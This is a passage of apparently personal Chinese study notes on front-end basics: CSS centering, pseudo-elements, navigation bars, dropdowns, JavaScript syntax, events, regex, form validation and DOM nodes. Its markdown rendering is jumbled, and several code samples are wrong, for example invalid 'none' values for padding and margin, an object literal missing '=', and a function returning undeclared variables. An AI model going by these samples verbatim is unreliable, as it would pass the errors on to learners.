class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.center</span> &#123;<br>    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">200px</span>;<br>    <span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">3px</span> solid green;<br>    <span class="hljs-attribute">text-align</span>: center;<br>&#125;<br> <br><span class="hljs-comment">/* 如果文本有多行，添加以下代码: */</span><br><span class="hljs-selector-class">.center</span> <span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">1.5</span>;<br>    <span class="hljs-attribute">display</span>: inline-block;<br>    <span class="hljs-attribute">vertical-align</span>: middle;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CSS伪元素"><a href="#CSS伪元素" class="headerlink" title="CSS伪元素"></a>CSS伪元素</h3><p>:first-line伪元素</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-tag">p</span><span class="hljs-selector-pseudo">:first</span>-line<br>&#123;<br>    <span class="hljs-attribute">color</span>: red;<br>    <span class="hljs-attribute">font-variant</span>: small-caps;<br>&#125;<br>first-line伪元素只用于块级元素<br></code></pre></td></tr></table></figure><p>before/after伪元素</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">用于在元素后面或前面添加东西，如在每个&lt;<span class="hljs-selector-tag">h2</span>&gt;前面添加图片<br><span class="hljs-selector-tag">h2</span><span class="hljs-selector-pseudo">:before</span>&#123;<br>    <span class="hljs-attribute">content</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&quot;a.jpg&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CSS导航栏的制作"><a href="#CSS导航栏的制作" class="headerlink" title="CSS导航栏的制作"></a>CSS导航栏的制作</h3><p>第一步：使用无序列表，元素为a标签</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>title1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>title2<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>title3<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>title4<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></td></tr></table></figure><p>再删除列表前的点，删除边距与填充</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">ul</span>&#123;<br>           <span class="hljs-built_in">list-style-type:</span> <span class="hljs-string">none</span>;<br>           <span class="hljs-string">padding</span>: <span class="hljs-string">none</span>;<br>           <span class="hljs-string">margin</span>: <span class="hljs-string">none</span>;<br>       &#125;<br></code></pre></td></tr></table></figure><p>给链接元素转换为块元素<br>并设置宽度（默认为最大，需要设置）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span>&#123;<br>    <span class="hljs-attribute">display</span>: block;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">60px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>进一步设置，鼠标移动到导航栏上后，修改颜色。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span>&#123;<br>    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#555</span>;<br>    <span class="hljs-attribute">color</span>: white;<br>&#125;<br></code></pre></td></tr></table></figure><p>添加active类，被选中</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.active</span>&#123;<br>    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#4CAF50</span>;<br>    <span class="hljs-attribute">color</span>: white;<br>&#125;<br>注意，不是:而是.<br>因为这里，是标记出当前页面所在的选项，而不是正在选择<br></code></pre></td></tr></table></figure><p>加上边框</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">ul</span> &#123;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#555</span>;<br>&#125;<br> <br><span class="hljs-selector-tag">li</span> &#123;<br>    <span class="hljs-attribute">text-align</span>: center;<br>    <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#555</span>;<br>&#125;<br> <br><span class="hljs-selector-tag">li</span><span class="hljs-selector-pseudo">:last-child</span> &#123;<br>    <span class="hljs-attribute">border-bottom</span>: none;<br>&#125;<br></code></pre></td></tr></table></figure><p>成为全屏高度的固定导航条</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">ul</span>&#123;<br>    <span class="hljs-attribute">position</span>: fixed;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">25%</span>;<br>    <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;<br>    <span class="hljs-attribute">overflow</span>: auto;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CSS导航栏2–水平导航栏"><a href="#CSS导航栏2–水平导航栏" class="headerlink" title="CSS导航栏2–水平导航栏"></a>CSS导航栏2–水平导航栏</h3><p>使用内联（inline）或浮动（float）的列表项。<br><strong>内联列表项</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">li</span><br>&#123;<br>    <span class="hljs-attribute">display</span>: inline;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CSS下拉菜单"><a href="#CSS下拉菜单" class="headerlink" title="CSS下拉菜单"></a>CSS下拉菜单</h3><p>当鼠标移动到指定元素上时，会出现下拉菜单</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-class">.dropdown</span> &#123;</span><br><span class="language-css">  <span class="hljs-attribute">position</span>: relative;</span><br><span class="language-css">  <span class="hljs-attribute">display</span>: inline-block;</span><br><span class="language-css">&#125;</span><br><span class="language-css"><span class="hljs-selector-class">.dropdown-content</span> &#123;</span><br><span class="language-css">  <span class="hljs-attribute">display</span>: none;</span><br><span class="language-css">  <span class="hljs-attribute">position</span>: absolute;</span><br><span class="language-css">  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#f9f9f9</span>;</span><br><span class="language-css">  <span class="hljs-attribute">min-width</span>: <span class="hljs-number">160px</span>;</span><br><span class="language-css">  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0px</span> <span class="hljs-number">8px</span> <span class="hljs-number">16px</span> <span class="hljs-number">0px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.2</span>);</span><br><span class="language-css">  <span class="hljs-attribute">padding</span>: <span class="hljs-number">12px</span> <span class="hljs-number">16px</span>;</span><br><span class="language-css">&#125;</span><br><span class="language-css"><span class="hljs-selector-class">.dropdown</span><span class="hljs-selector-pseudo">:hover</span> <span class="hljs-selector-class">.dropdown-content</span> &#123;</span><br><span class="language-css">  <span class="hljs-attribute">display</span>: block;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br>[mycode3]<br>[mycode3 type=&quot;html&quot;]<br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>鼠标移动到我这！<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-content&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>菜鸟教程<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>www.runoob.com<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><h3 id="JS的用法"><a href="#JS的用法" class="headerlink" title="JS的用法"></a>JS的用法</h3><p>js代码必须位于HTML中的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs <script>```与```</script>```之间">通常，我们需要在某个事件发生时执行代码，比如当用户点击按钮时。<br>如果我们把 JavaScript 代码放入函数中，就可以在事件发生时调用该函数。<br>### JS的输出<br>JS没有任何打印或者输出的函数<br>**JS显示数据**<br>window.alert()<br><br>弹出警告窗口<br></code></pre></td></tr></table></figure><script>window.alert(5+6);</script><p>会弹出11的窗口</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>操作HTML元素<br>document<span class="hljs-selector-class">.getElementById</span>(<span class="hljs-string">&quot;demo&quot;</span>)<span class="hljs-selector-class">.innerHTML</span> = <span class="hljs-string">&quot;段落已修改&quot;</span><br>这个是按id查找元素，并进行操作的方法<br></code></pre></td></tr></table></figure><p id="demo">段落1</p><script>document.getElementById("demo").innerHTML = "段落已修改"</script>会显示“段落已修改”<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">直接写入<span class="hljs-selector-tag">HTML</span>文档<br></code></pre></td></tr></table></figure>document.write(Date());<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">会额外输出<span class="hljs-built_in">write</span>内的内容<br>**写到控制台**<br></code></pre></td></tr></table></figure>console.log(message)会输出内容到控制台<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">### JS字面量<br>**数字字面量**<br></code></pre></td></tr></table></figure>3.141001123e5<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**字符串字面量**</span><br>单双引号皆可<br></code></pre></td></tr></table></figure>"jobe d"'lddd sd'<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**表达式字面量**</span><br></code></pre></td></tr></table></figure>7+102 * 8<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**数组字面量**</span><br></code></pre></td></tr></table></figure>[40, 100, 200]<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**对象字面量**</span><br></code></pre></td></tr></table></figure>{firstname:"John", lastname:"Done"}<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**函数字面量**</span><br></code></pre></td></tr></table></figure>function myFunc(am,bm){    return a+b;}<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-comment">**JS变量**</span><br>用<span class="hljs-keyword">var</span>定义<br></code></pre></td></tr></table></figure>var x, length；<p>x = 5；<br>length = 6；</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">**JS注释**<br>双斜杠```//```<br>**且JS大小写敏感**<br>### JS语句<br></code></pre></td></tr></table></figure><p>可以用分号结尾一句代码<br>可以多写空格，提高可读性</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">### JS数据类型和对象<br>new关键字指定类型<br></code></pre></td></tr></table></figure><p>var x=  new Number<br>var ca= new String<br>var fl= new boolean</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**对象**</span><br>对象有<span class="hljs-strong">**属性**</span>和<span class="hljs-strong">**方法**</span><br></code></pre></td></tr></table></figure><p>定义一个对象</p><p>var car = { name: “Fiat”, model:500, color: “white” };<br>每个值用name: value表示，值之间用逗号分割</p><p>访问对象属性</p><p>car.name<br>car[“color”]<br>两种方式均可</p><p>对象方法<br>创建对象：<br>var person{<br>    name:”DAvid”,<br>    lasy:”DAAA”,<br>    methodName:function(){<br>    return name + “ “ + lasy<br>    }<br>}<br>即在类内定义好了方法<br>调用：<br>person.methodName()<br>即可</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">### JS函数<br>定义函数<br></code></pre></td></tr></table></figure><p>function funcname(var1,var2){<br>    //执行代码<br>}</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs clean">不用声明参数的数据类型<br>### JS事件<br>#### HTML事件<br>如：HTML页面完成加载<br>HTML input字段发生改变<br>HTML按钮被点击<br>当发生事件时，可以用JS做些事情，语法如下<br></code></pre></td></tr></table></figure><some-HTML-element some-event="JavaScript 代码">如：<button onclick="this.innerHTML=Date()">现在的时间是</button>代码将修改自身元素的内容  this.innerHTML可以达到效果<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">常见的<span class="hljs-selector-tag">HTML</span>事件<br></code></pre></td></tr></table></figure><p>onchange HTML元素改变<br>onclick 点击HTML元素<br>onmouseover 鼠标移动到元素上</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">### JS字符串<br>可以用索引位置，从<span class="hljs-number">0</span>开始访问字符<br></code></pre></td></tr></table></figure><p>var charn = str[9]</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">字符串中的引号，不要跟字符串的引号相同，一双一单<br><span class="hljs-strong">**字符串长度**</span><br></code></pre></td></tr></table></figure><p>var txt = “ABNCNJMMMM”<br>var num = txt.length;<br>length是内置属性</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**字符串可以是对象**</span><br></code></pre></td></tr></table></figure><p>var fristname=new String(“bob”)<br>typeof fristname // return String</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">String可以用```+```链接起来<br>数字与字符串相加，将数字自动转换为字符串后，返回字符串<br></code></pre></td></tr></table></figure><p>z = “hello” + 5<br>hello5</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">### JS条件语句<br>与C++一样<br>switch也一样<br><br>### JS for循环<br></code></pre></td></tr></table></figure><p>for (var i=0;i&lt;cars.length;i++)<br>{<br>    document.write(cars[i] + “<br>“);<br>}</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">也与C</span>++<span class="hljs-comment">一样，只是第一个参数是var定义的变量</span><br><span class="hljs-comment">for</span>--<span class="hljs-comment">in循环</span><br></code></pre></td></tr></table></figure><p>var person = {fname:”boll”, lname:”vil”, age:56};<br>for(x in person)<br>{<br>    txt = txt + person[x];<br>}</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">### JS类型转换<br></code></pre></td></tr></table></figure><p>var a<br>a=String(123)<br>var b<br>b = Number(“3.14”)</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">### JS正则表达式（RE）<br>如<br></code></pre></td></tr></table></figure><p>var patt = /runoob/i</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">```<br>/runoob/是正则表达式主题，用于检索<br>i是修饰符，表示不分大小写<br></code></pre></td></tr></table></figure><p>正则表达式常用于检索和替换中</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">var str <span class="hljs-operator">=</span> document.getElementById(<span class="hljs-string">&quot;DEmo&quot;</span>).innerHTML<span class="hljs-comment">;</span><br>var n <span class="hljs-operator">=</span> str.search(<span class="hljs-string">&quot;Runoob&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>replace:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> str = document.getElementById(<span class="hljs-string">&quot;demo&quot;</span>).innerHTML;<br><span class="hljs-keyword">var</span> txt = str.<span class="hljs-built_in">replace</span>(<span class="hljs-regexp">/microsoft/i</span>,<span class="hljs-string">&quot;Runoob&quot;</span>);<br>修改了txt内容，str未变<br><br></code></pre></td></tr></table></figure><h3 id="JS表单验证"><a href="#JS表单验证" class="headerlink" title="JS表单验证"></a>JS表单验证</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">validateForm</span>(<span class="hljs-params"></span>)</span><br><span class="language-javascript">&#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> x=<span class="hljs-variable language_">document</span>.<span class="hljs-property">forms</span>[<span class="hljs-string">&quot;myForm&quot;</span>][<span class="hljs-string">&quot;fname&quot;</span>].<span class="hljs-property">value</span>;</span><br><span class="language-javascript">    <span class="hljs-keyword">if</span>(x == <span class="hljs-literal">null</span>||x == <span class="hljs-string">&quot;&quot;</span>)</span><br><span class="language-javascript">    &#123;</span><br><span class="language-javascript">        <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;姓必须填写&quot;</span>);</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myForm&quot;</span> <span class="hljs-attr">action</span> = <span class="hljs-string">&quot;demo.php&quot;</span> <span class="hljs-attr">onsubmit</span>=<span class="hljs-string">&quot;return validateForm()&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>姓:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span> = <span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span> = <span class="hljs-string">&quot;fname&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span> = <span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span> = <span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="JS的this"><a href="#JS的this" class="headerlink" title="JS的this"></a>JS的this</h3><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">在方法中，<span class="hljs-keyword">this</span>表示该方法所属的对象<br>fullName : function()&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.firstname + <span class="hljs-string">&quot; &quot;</span> + <span class="hljs-keyword">this</span>.lastname;<br>&#125;<br>单独使用，<span class="hljs-keyword">this</span>是全局对象<br>事件中的<span class="hljs-keyword">this</span><br>在HTML事件句柄中，<span class="hljs-keyword">this</span>指向了接收事件的HTML元素<br>&lt;button onclick=<span class="hljs-string">&quot;this.style.display =&#x27;none&#x27;&quot;</span>&gt;<br>点我后就消失咯<br>&lt;/button&gt;<br></code></pre></td></tr></table></figure><h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><p>DOM(Document Object Model)<strong>文档对象模型</strong></p><h3 id="DOM节点"><a href="#DOM节点" class="headerlink" title="DOM节点"></a>DOM节点</h3><p>DOM节点树<br><img src="/2022/06/30/front/pe.png"><br>节点之间拥有层级关系<br>常用<strong>父</strong>，<strong>子</strong>，<strong>同胞</strong>等术语描述这些关系</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>DOM 教程<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>DOM 课程1<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Hello world!<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>此代码中<br>文本结点”hello world!”的父节点是<code>&lt;p&gt;</code>节点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs <h1>```与```<p>```节点是同胞结点">### DOM方法<br>HTML DOM方法是我们可以在节点（即HTML元素）上执行的动作<br>HTML DOM属性是我们可以在节点设置和修改的值<br>#### 编程接口<br>**getElementById()方法**<br></code></pre></td></tr></table></figure><p>var elemnt = document.getElementById(“intro”);</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">以及一些常用的方法<br></code></pre></td></tr></table></figure><p>appendChild(node)插入新的子节点<br>removeChild(node)删除字节点</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs clean">### DOM属性<br>**innerHTML属性**<br>获取元素内容的最简单的方法是使用innerHTML属性<br>innerHTML属性对于获取和替换HTML元素的内容很有用<br>注意**inner**<br>**nodeValue属性**<br>nodeValue属性规定节点的值<br>元素节点的nodeValue是undefined或null<br>文本节点的nodeValue是文本本身<br>属性节点的nodeValue是属性值<br>### DOM访问<br>访问HTML元素（节点）<br>**getElementById()方法**<br></code></pre></td></tr></table></figure><p>document.getElementById(“id”);</p><p id="intro">helloworld</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">id相对于，以起到寻找的作用<br>**<span 